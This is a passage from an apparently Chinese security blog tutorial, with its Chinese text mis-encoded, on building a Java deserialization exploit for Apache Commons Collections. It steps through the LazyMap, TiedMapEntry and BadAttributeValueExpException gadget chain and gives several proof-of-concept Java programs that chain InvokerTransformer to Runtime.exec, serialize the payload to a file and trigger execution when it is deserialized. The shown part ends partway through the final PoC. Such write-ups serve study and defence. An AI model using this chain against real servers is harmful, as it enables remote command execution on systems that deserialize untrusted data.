                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>
        lazyMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§¦å‘æ¼æ´</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è®¡ç®—å™¨æˆåŠŸå¼¹å‡º</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215558587.png" alt="image-20210805215558587" loading="lazy"></p>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬å°è¯•æ¨¡æ‹Ÿè¿œç¨‹æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯ä¹‹é—´çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æµç¨‹ã€‚</p>
<p><strong>POC</strong>:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LazyMapExploit</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*
         * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
         * */</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>

        <span class="token comment">//åºåˆ—åŒ–</span>

        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*
         * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
         * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> target <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        target<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§¦å‘æ¼æ´</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆåŠŸï¼æˆ‘ä»¬ç°åœ¨çœ‹çœ‹ï¼ŒæœåŠ¡ç«¯è§¦å‘æ¼æ´çš„è¯ï¼Œéœ€è¦ä»€ä¹ˆæ¡ä»¶ï¼š å°†ååºåˆ—åŒ–åçš„objectå¼ºåˆ¶è½¬åŒ–ä¸ºMapç±»ï¼Œç„¶åå†è°ƒç”¨get()æ–¹æ³• - çœ‹ä¸Šå»ä¾ç„¶æœ‰ç‚¹éº»çƒ¦ï¼Œæˆ‘ä»¬æœ‰ä»€ä¹ˆåŠæ³•èƒ½è®©å®ƒæ›´å®¹æ˜“è¢«è§¦å‘å‘¢ï¼Ÿ</p>
<h4 id="ç¬¬äº”æ­¥ï¼šTiedMapEntry-getValue"><a href="#ç¬¬äº”æ­¥ï¼šTiedMapEntry-getValue" class="headerlink" title="ç¬¬äº”æ­¥ï¼šTiedMapEntry.getValue()"></a>ç¬¬äº”æ­¥ï¼šTiedMapEntry.getValue()</h4><p>å®‰å…¨ç ”ç©¶å‰è¾ˆä»¬å¹¶æœªå‘ç°æœ‰å¯æ§ä¸”è°ƒç”¨<code>get()</code>æ–¹æ³•çš„<code>readObject()</code>æ–¹æ³•ï¼Œä½†åœ¨<code>TiedMapEntry</code>ç±»ä¸­ï¼Œ<code>getValue()</code>æ–¹æ³•è°ƒç”¨äº†get()æ–¹æ³•ï¼Œ<code>map</code>å˜é‡æ˜¯å¯æ§çš„ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806093126421.png" alt="image-20210806093126421" loading="lazy"></p>
<h4 id="ç¬¬å…­æ­¥ï¼šTiedMapEntry-toString"><a href="#ç¬¬å…­æ­¥ï¼šTiedMapEntry-toString" class="headerlink" title="ç¬¬å…­æ­¥ï¼šTiedMapEntry.toString()"></a>ç¬¬å…­æ­¥ï¼šTiedMapEntry.toString()</h4><p>æˆ‘ä»¬ç»§ç»­æ‰¾æœ‰æ²¡æœ‰è°ƒç”¨<code>getValue()</code>çš„æ–¹æ³•ï¼Œå°±åœ¨<code>TiedMapEntry</code>ç±»ä¸­ï¼Œæˆ‘ä»¬å‘ç°äº†<code>toString()</code>ï¼Œå…¶ä¸­ä¼šè°ƒç”¨åˆ°<code>getValue()</code>ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>è¿™æ ·ä¸€æ¥æˆ‘ä»¬çš„åˆ©ç”¨é“¾ä¾¿æ˜¯ - <code>è°ƒç”¨toString()ä¼šè§¦å‘ -&gt; getValue() -&gt;get()</code>ã€‚é‚£æ˜¯å¦èƒ½åƒ<code>TransformedMap</code>ç‰ˆæœ¬çš„POCä¸€æ ·ï¼Œèƒ½å¤Ÿæ‰¾åˆ°ä¸€ä¸ªå¯æ§çš„<code>readObject()</code>ç›´æ¥è°ƒç”¨<code>toString()</code>å‘¢ï¼Ÿ</p>
<h4 id="ç¬¬ä¸ƒæ­¥ï¼šBadAttributeValueExpException"><a href="#ç¬¬ä¸ƒæ­¥ï¼šBadAttributeValueExpException" class="headerlink" title="ç¬¬ä¸ƒæ­¥ï¼šBadAttributeValueExpException"></a>ç¬¬ä¸ƒæ­¥ï¼šBadAttributeValueExpException</h4><p>åœ¨<code>BadAttributeValueExpException</code>ç±»ä¸­ï¼Œæˆ‘ä»¬å‘ç°äº†<code>readObject()</code>æ–¹æ³•ï¼Œå…¶è°ƒç”¨äº†<code>toString()</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> ois<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ObjectInputStream<span class="token punctuation">.</span>GetField</span> gf <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Object</span> valObj <span class="token operator">=</span> gf<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//valObjæ˜¯ä»fieldsä¸­å¾—åˆ°valçš„å€¼</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>valObj <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        val <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>valObj <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        val<span class="token operator">=</span> valObj<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span>
            <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Long</span>
            <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Integer</span>
            <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Float</span>
            <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Double</span>
            <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Byte</span>
            <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Short</span>
            <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Boolean</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        val <span class="token operator">=</span> valObj<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„è°ƒç”¨äº†toString()</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">// the serialized object is from a version without JDK-8019292 fix</span>
        val <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">identityHashCode</span><span class="token punctuation">(</span>valObj<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"@"</span> <span class="token operator">+</span> valObj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶<code>valObj</code>ä¸º<code>TiedMapEntry</code>ç±»çš„<code>object</code>ï¼Œå°±èƒ½å¤Ÿè§¦å‘æ¼æ´ã€‚è¿™é‡Œçš„<code>valObj</code>æ˜¯ä»ååºåˆ—åŒ–åçš„<code>object</code>çš„<code>fields</code>ä¸­ç›´æ¥å¾—åˆ°çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªå€¼ä¸º<code>TiedMapEntry</code>ç±»<code>object</code>çš„<code>val</code>fieldã€‚</p>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>constructor</code>èƒ½ä¸èƒ½ç›´æ¥èµ‹å€¼ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">BadAttributeValueExpException</span> <span class="token punctuation">(</span><span class="token class-name">Object</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>val <span class="token operator">=</span> val <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> val<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//å¦‚æœvalä¸ºnullï¼Œåˆ™this.val=null</span>
    <span class="token comment">//å¦‚æœvalä¸ä¸ºnull,åˆ™this.val = val.toString()</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨<code>constructor</code>ä¸­ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥é€šè¿‡æ„é€ æ–¹æ³•ä¼ å…¥<code>TiedMapEntry</code>ç±»ï¼Œä¼šåœ¨å®¢æˆ·ç«¯åˆ›å»º<code>object</code>çš„æ—¶å€™å°±æ‰§è¡Œ<code>toString()</code>è§¦å‘æ–¹æ³•å¹¶æŠŠç»“æœèµ‹å€¼ç»™<code>val</code>ï¼Œè€ŒæœåŠ¡å™¨åœ¨è°ƒç”¨<code>readObject()</code>çš„æ—¶å€™è·å–åˆ°çš„<code>val</code>ä¸º<strong>toString()æ–¹æ³•çš„è¿”å›å€¼</strong>ï¼Œä»è€Œä¸ä¼šè§¦å‘æ¼æ´ã€‚</p>
<p>äºæ˜¯æˆ‘ä»¬ä¸èƒ½é€šè¿‡<code>constructor</code>ä¼ å…¥<code>TiedMapEntry</code>ç±»çš„<code>object</code>ï¼Œç›¸åï¼Œæˆ‘ä»¬è®¾ç½®å®ƒä¸º<code>null</code>ã€‚æˆ‘ä»¬å°è¯•èƒ½å¦æ‰‹åŠ¨è®¾ç½®valçš„å€¼ï¼š</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806095753374.png" alt="image-20210806095753374" loading="lazy"></p>
<p>å‘ç°å¹¶ä¸èƒ½è®¿é—®åˆ°<code>val</code>å€¼ï¼Œvalå€¼æ˜¯<code>private</code>å±æ€§,<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806095846949.png" alt="image-20210806095846949" loading="lazy"></p>
<p>åœ¨<code>BadAttributeValueExpException</code>ç±»ä¸­ä¹Ÿæ²¡æœ‰<code>setter</code>èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬å»è®¾ç½®ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå°„å¯¹å…¶èµ‹å€¼ã€‚</p>
<h4 id="æœ€ç»ˆPOC-1"><a href="#æœ€ç»ˆPOC-1" class="headerlink" title="æœ€ç»ˆPOC"></a>æœ€ç»ˆPOC</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LazyMapExploit</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*
         * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
         * */</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>
        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç»‘å®šç»™TiedMapEntryï¼Œå¦‚æœTiedMapEntryçš„toString()è¢«æ‰§è¡Œï¼ŒlazyMapä¼šè¢«æ‰§è¡Œget()</span>
        <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¯¥ç±»ä¸­çš„readObject()å¯æ§ï¼Œå¯æ‰§è¡ŒTiedMapEntryçš„toString()</span>
        <span class="token comment">//åˆ›å»ºä¸€ä¸ªbadAttributeValueExpExceptionå®ä¾‹ï¼Œè¿™å°†ä½œä¸ºæˆ‘ä»¬çš„æœ€ç»ˆçš„æ¶æ„objectè¢«åºåˆ—åŒ–</span>
